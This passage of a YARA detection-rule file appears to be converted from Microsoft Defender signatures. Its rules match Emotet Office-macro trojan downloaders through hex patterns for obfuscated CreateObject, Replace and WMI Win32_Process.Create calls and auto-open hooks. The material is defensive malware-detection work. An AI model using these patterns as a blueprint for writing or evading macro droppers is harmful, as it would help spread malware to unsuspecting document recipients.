        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-21] 2e [0-21] 2e 43 61 70 74 69 6f 6e 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 28 [0-21] 28 [0-24] 29 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QD_2147744555_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QD!MTB"
        threat_id = "2147744555"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-21] 2e [0-21] 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 20 2b 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 20 2b 20 [0-21] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QE_2147744568_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QE!MTB"
        threat_id = "2147744568"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 67 6d 74 [0-21] 69 [0-21] 3a [0-21] 57 [0-21] 69 [0-21] 6e [0-21] 33 [0-21] 32 [0-21] 50 [0-21] 72 [0-21] 6f [0-21] 63 [0-21] 65 [0-21] 73 [0-21] 73 [0-21] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 20 2b 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QF_2147744581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QF!MTB"
        threat_id = "2147744581"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-37] 20 2b 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 20 2b 20 [0-21] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".StoryRanges(wdMainTextStory).Delete" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QG_2147744591_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QG!MTB"
        threat_id = "2147744591"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 69 6e 33 [0-21] 32 [0-21] 50 [0-21] 72 [0-21] 6f [0-21] 63 [0-21] 65 [0-21] 73 [0-21] 73 [0-21] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 20 2b 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 20 2b 20 [0-21] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QH_2147744622_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QH!MTB"
        threat_id = "2147744622"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 32 5f 50 [0-21] 72 [0-21] 6f [0-21] 63 [0-21] 65 [0-21] 73 [0-21] 73 [0-21] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 20 2b 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QI_2147744640_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QI!MTB"
        threat_id = "2147744640"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-69] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-37] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-7] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
        $x_1_6 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QJ_2147744652_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QJ!MTB"
        threat_id = "2147744652"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-37] 28 22 [0-85] 3a [0-69] 65 [0-21] 73 [0-21] 73 22 29 29 2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QL_2147744689_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QL!MTB"
        threat_id = "2147744689"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 20 2b 20 [0-21] 28 [0-2] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 52 65 70 6c 61 63 65 28 [0-32] 20 2b 20 [0-32] 2c 20 [0-32] 20 2b 20 [0-32] 2c 20 [0-32] 20 2b 20 22 22 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-7] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
        $x_1_6 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QN_2147744708_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QN!MTB"
        threat_id = "2147744708"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 20 2b 20 [0-144] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29 20 26 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-134] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
        $x_1_6 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GC_2147744737_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GC!MTB"
        threat_id = "2147744737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 28 00 [0-15] 2c 00 20 00 22 00 [0-15] 22 00 2c 00 20 00 22 00 22 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 [0-15] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 28 [0-30] 2c 20 [0-30] 2c 20 [0-30] 2c 20 [0-30] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 4f 00 62 00 6a 00 65 00 63 00 74 00 28 00 [0-30] 28 00 [0-30] 28 00 [0-100] 29 00 29 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-30] 28 [0-30] 28 [0-100] 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QO_2147744743_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QO!MTB"
        threat_id = "2147744743"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 2e [0-21] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29 20 26 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-152] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
        $x_1_6 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QP_2147744758_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QP!MTB"
        threat_id = "2147744758"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 2e [0-21] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29 20 26 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-152] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
        $x_1_6 = "ShowWindow" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QS_2147744781_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QS!MTB"
        threat_id = "2147744781"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 2e [0-21] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29 20 26 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QR_2147744782_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QR!MTB"
        threat_id = "2147744782"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-21] 28 [0-21] 2e [0-21] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 20 5f [0-16] 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29 20 2b 20 52 65 70 6c 61 63 65 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GD_2147744846_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GD!MTB"
        threat_id = "2147744846"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 28 00 [0-15] 2c 00 20 00 [0-15] 2c 00 20 00 22 00 22 00 29 00}  //weight: 10, accuracy: Low
        $x_10_2 = {52 65 70 6c 61 63 65 28 [0-15] 2c 20 [0-15] 2c 20 22 22 29}  //weight: 10, accuracy: Low
        $x_10_3 = {2e 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 29 00}  //weight: 10, accuracy: Low
        $x_10_4 = {2e 43 72 65 61 74 65 28 [0-30] 2c 20 [0-30] 2c 20 [0-30] 2c 20 [0-30] 29}  //weight: 10, accuracy: Low
        $x_1_5 = {2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 20 00 2b 00 20 00 [0-20] 2e 00 [0-20] 2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-20] 2e [0-20] 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 4f 00 62 00 6a 00 65 00 63 00 74 00 28 00 [0-30] 28 00 [0-100] 29 00 29 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-30] 28 [0-100] 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            ((3 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_GE_2147744851_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GE!MTB"
        threat_id = "2147744851"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "31"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 [0-30] 28 00 [0-15] 2c 00 20 00 [0-15] 2c 00 20 00 22 00 22 00 29 00}  //weight: 10, accuracy: Low
        $x_10_2 = {52 65 70 6c 61 63 65 [0-30] 28 [0-15] 2c 20 [0-15] 2c 20 22 22 29}  //weight: 10, accuracy: Low
        $x_10_3 = {2e 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 2c 00 20 00 [0-30] 29 00}  //weight: 10, accuracy: Low
        $x_10_4 = {2e 43 72 65 61 74 65 28 [0-30] 2c 20 [0-30] 2c 20 [0-30] 2c 20 [0-30] 29}  //weight: 10, accuracy: Low
        $x_10_5 = {3d 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 4f 00 62 00 6a 00 65 00 63 00 74 00 28 00 [0-30] 28 00 [0-100] 29 00 29 00}  //weight: 10, accuracy: Low
        $x_10_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-30] 28 [0-100] 29 29}  //weight: 10, accuracy: Low
        $x_1_7 = {45 00 6e 00 64 00 20 00 49 00 66 00 [0-30] 22 00 1e 00 77 00 1e 00 69 00 1e 00 6e 00 1e 00 6d 00 1e 00 67 00 1e 00 6d 00 1e 00 74 00 1e 00 73 00 1e 00 3a 00 1e 00 57 00 1e 00 69 00 1e 00 6e 00}  //weight: 1, accuracy: Low
        $x_1_8 = {45 6e 64 20 49 66 [0-30] 22 1e 00 77 1e 00 69 1e 00 6e 1e 00 6d 1e 00 67 1e 00 6d 1e 00 74 1e 00 73 1e 00 3a 1e 00 57 1e 00 69 1e 00 6e}  //weight: 1, accuracy: Low
        $x_1_9 = {45 00 6e 00 64 00 20 00 49 00 66 00 [0-50] 5f 00 1e 00 50 00 1e 00 72 00 1e 00 6f 00 1e 00 63 00 1e 00 65 00 1e 00 73 00 1e 00 73 00 1e 00}  //weight: 1, accuracy: Low
        $x_1_10 = {45 6e 64 20 49 66 [0-50] 5f 1e 00 50 1e 00 72 1e 00 6f 1e 00 63 1e 00 65 1e 00 73 1e 00 73 1e 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_10_*) and 1 of ($x_1_*))) or
            ((4 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_QT_2147744862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QT!MTB"
        threat_id = "2147744862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 [0-21] 28 [0-37] 2c 20 [0-37] 2c 20 22 22 29 20 2b 20 52 65 70 6c 61 63 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QU_2147744877_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QU!MTB"
        threat_id = "2147744877"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 [0-1] 28 [0-37] 2c 20 22 [0-37] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QV_2147744902_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QV!MTB"
        threat_id = "2147744902"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 52 65 70 6c 61 63 65 [0-1] 28 [0-32] 2c 20 22 [0-32] 22 2c 20 22 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QW_2147745009_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QW!MTB"
        threat_id = "2147745009"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-53] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 [0-32] 2e [0-69] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 52 65 70 6c 61 63 65 [0-1] 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 73 67 42 6f 78 28 [0-32] 2e [0-32] 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 [0-32] 2e [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QX_2147745022_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QX!MTB"
        threat_id = "2147745022"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
